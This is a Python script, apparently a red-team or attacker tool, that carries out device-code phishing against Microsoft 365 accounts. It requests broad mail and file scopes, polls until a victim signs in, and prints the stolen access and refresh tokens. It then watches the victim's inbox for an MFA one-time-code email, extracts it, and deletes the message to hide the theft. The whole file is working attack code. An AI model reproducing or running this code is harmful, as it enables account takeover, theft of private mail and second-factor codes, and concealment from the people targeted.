# Reference:
# https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code
# https://o365blog.com/post/phishing/
# https://github.com/rvrsh3ll/TokenTactics

import requests
import json
import time
import sys
import re
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Ignoring the warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def getDeviceCode(url, clientId):

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    scope = "Contacts.Read Files.ReadWrite Mail.Read Notes.Read Mail.ReadWrite openid profile User.Read email offline_access"

    # https://docs.microsoft.com/en-us/graph/permissions-reference
    ## Contacts.Read - No Admin Consent Required
    ## Files.ReadWrite - No Admin Consent Required
    ## Mail.Read - No Admin Consent Required
    ## Notes.Read - No Admin Consent Required
    ## openid - No Admin Consent Required
    ## profile - No Admin Consent Required
    ## User.Read - No Admin Consent Required
    ## email - No Admin Consent Required
    ## offline_access - No Admin Consent Required
    ## Mail.ReadWrite - No Admin Consent Required

    r = requests.post(url, headers=headers, data={"client_id": clientId, "scope": scope}, verify=False)

    if r.status_code != 200:
        print("[ERROR] Invalid client_id")
    else:
        data = json.loads(r.text)

        user_code = data['user_code']
        device_code = data['device_code']

    return {'user_code': user_code, 'device_code': device_code}

def getAccessToken(url, clientId, device_code):

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    grant = "urn:ietf:params:oauth:grant-type:device_code"

    while True:
        try:
           
            r = requests.post(url, headers=headers, data={"grant_type": grant, "client_id": clientId, "code": device_code}, verify=False)

            time.sleep(3)

            if "authorization_pending" in r.text:
                print("[INFO] Authorization Pending...")
            elif "expired_token" in r.text:
                print("[INFO] Token Expired!") # Token expires in 15 min
                break
            elif r.status_code == 200:
                print(colored("[INFO] Phishing Succesful!", 'yellow'))
                
                data = json.loads(r.text)

                access_token = data['access_token']
                refresh_token = data['refresh_token']
                id_token = data['id_token']
                break
        except ValueError:
            print("[ERROR] Something Went Wrong!")

    return {'access_token': access_token, 'refresh_token': refresh_token, 'id_token': id_token}

def getMail(url, access_token):

    # "https://graph.microsoft.com/v1.0/me/MailFolders/inbox/messages?select=id,sentDateTime,subject,bodyPreview,toRecipients&top=1"

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
        'Content-Type': 'application/json',
        'Authorization': 'Bearer %s' % access_token,
    }

    while True:
        try:
            r = requests.get(url, headers=headers)

            time.sleep(3)

            data = json.loads(r.text)

            if "MFA - One Time Code" in r.text: # This can be changed for your use case
                print(colored("[INFO] MFA OTP Email Found!", 'yellow'))
                value = data['value']
                print(value)
                print("[INFO] Saving Email to email.txt...")

                f = open("email.txt", "w")
                f.write(str(value))
                f.close()

                f = open("email.txt", "r")
                k = f.read()
                k = re.split(r', ',k)
                j = re.split(r"'", k[1])
                email_id = j[3]
                break
            else:
                print("[INFO] Waiting for MFA OTP Email...")
        except ValueError:
            print("[ERROR] Something Went Wrong!")
    return email_id

def deleteMail(url, access_token, emailId):

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
        'Content-Type': 'application/json',
        'Authorization': 'Bearer %s' % access_token,
    }

    url = url + emailId

    r = requests.delete(url, headers=headers, verify=False)

    if r.status_code == 204:
        print(colored("[INFO] Email Successfully Deleted", 'yellow'))
    else:
        print("[ERROR] Didn't find the email")

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("[INFO] Usage: python3 %s <client_id>" % sys.argv[0])
        print("[INFO] Example: python3 %s fake-2ce0-4958-a61a-a5055ef62bf8" % sys.argv[0])
        sys.exit(1)
    
    global url_devicecode
    url_devicecode = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode'

    global url_token
    url_token = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token'

    global url_mail
    url_mail = "https://graph.microsoft.com/v1.0/me/MailFolders/inbox/messages?select=id,sentDateTime,subject,bodyPreview,toRecipients&top=1"

    global url_delete
    url_delete = "https://graph.microsoft.com/v1.0/me/messages/"

    clientId = sys.argv[1]

    code = getDeviceCode(url_devicecode, clientId)
    user_code = code['user_code']
    device_code = code['device_code']

    print(colored("[INFO] user_code: %s" % user_code, 'green'))
    print(colored("[INFO] device_code: %s\n" % device_code, 'green'))

    token = getAccessToken(url_token, clientId, device_code)
    access_token = token['access_token']
    refresh_token = token['refresh_token']
    id_token = token['id_token']

    print(colored("[INFO] access_token: %s\n" % access_token, 'green'))
    print(colored("[INFO] refresh_token: %s\n" % refresh_token, 'green'))
    print(colored("[INFO] id_token: %s\n" % id_token, 'green'))

    emailId = getMail(url_mail, access_token)
    print(colored("[INFO] Email ID: %s" % emailId, 'green'))

    time.sleep(3)

    deleteMail(url_delete, access_token, emailId)
    
